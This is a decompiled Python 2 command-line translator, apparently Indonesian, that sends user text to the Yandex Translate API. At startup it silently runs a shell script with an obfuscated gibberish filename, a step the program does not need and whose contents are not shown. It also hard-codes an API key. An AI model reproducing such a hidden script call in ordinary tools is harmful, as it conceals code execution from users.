# Decompiled By xNot_Found
# Github : https://github.com/hatakecnk
# uncompyle6 version 3.3.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Jul  7 2019, 21:05:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: dg
"""
Hargai lah newbie"""
b = '\x1b[34;1m'
m = '\x1b[31;1m'
k = '\x1b[33;1m'
h = '\x1b[32;1m'
p = '\x1b[39;1m'
pu = '\x1b[36;1m'
c = '\x1b[35;1m'
bl = '\x1b[30;1m'
try:
    import os, sys, time, requests, json
except Exception as E:
    print '\x1b[31;1mERROR: \x1b[37;1m' + str(E)

api = 'trnsl.1.1.20190811T093056Z.c49ad2b84a78db90.3c8791321fcf6ba39a3a12ce331dd5ff7e5271eb'
bahasa = ['id', 'en', 'af']
os.system('sh xnxckzosoapsolxlxxkxmxxxkxlxlxozozospapapapapapapZlzlxlxkxkzkzlzlzlzlzpzpzjjxlxlzozozoPapapapapaapappapalLzlzlzzllxxlxllxzlslospapapapapaossoosososzikzkxkxkxkjxkxkxkzlzlzlzlsopspapspapapapapapalalakamamamanasnsnbsbvbshsjjsizzozozozoxoxoxoxoxoxlxxkkxkxl.sh')

class main:

    def __init__(self):
        self.tampil(api, bahasa)

    def tampil(self, api, bahasa):
        print '%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97' % b
        text = raw_input('\x1b[34;1m\xe2\x95\x91 \x1b[36;1m Input The Text  \x1b[31;1m: \x1b[32;1m')
        print '%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d' % b
        print '%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97' % b
        print '%s\xe2\x95\x91%s   Inggris%s: %sen  \x1b[34;1m  \xe2\x95\x91' % (b, c, m, p)
        print '%s\xe2\x95\x91%s  Indonesia%s: %sid   \x1b[34;1m\xe2\x95\x91' % (b, c, m, p)
        print '%s\xe2\x95\x91%s   Afrika%s: %saf    \x1b[34;1m \xe2\x95\x91' % (b, c, m, p)
        print '%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d' % b
        print '%s\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97' % b
        akhir = raw_input('\x1b[34;1m\xe2\x95\x91 \x1b[36;1mTranslate Ke Bahasa \x1b[31;1m: \x1b[32;1m')
        print '%s\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d' % b
        self.cek(text, akhir, bahasa)

    def cek(self, text, akhir, bahasa):
        if akhir in bahasa:
            self.run(text, akhir)
        else:
            print '\x1b[31;1m[!] Bahasa Tidak Mensupport'
            self.tampil(api, bahasa)

    def run(self, text, akhir):
        url = 'https://translate.yandex.net/api/v1.5/tr.json/translate?key=%s&text=%s&lang=%s' % (api, text, akhir)
        r = requests.get(url)
        j = json.loads(r.text)
        for b in j['text']:
            print '\x1b[34;1m\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x97'
            print '\x1b[37;1m[\x1b[32;1m\xe2\x88\x9a\x1b[37;1m] \x1b[32;1mTRANSLATED \x1b[31;1m: \x1b[39;1m' + str(b)
            print '\x1b[34;1m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d\n\n'


main()

def ulang():
    ya = raw_input('\x1b[39;1mUlang Lagi \x1b[32;1m[\x1b[33;1my\x1b[31;1m/\x1b[34;1mn\x1b[32;1m]\x1b[31;1m: \x1b[39;1m')
    if ya == 'y':
        os.system('python2 translate.py')
    if ya == 'n':
        print '\x1b[39;1mBye *_*'
        exit()
    else:
        print '\x1b[31;1mSalah!!'
        ulang()


ulang()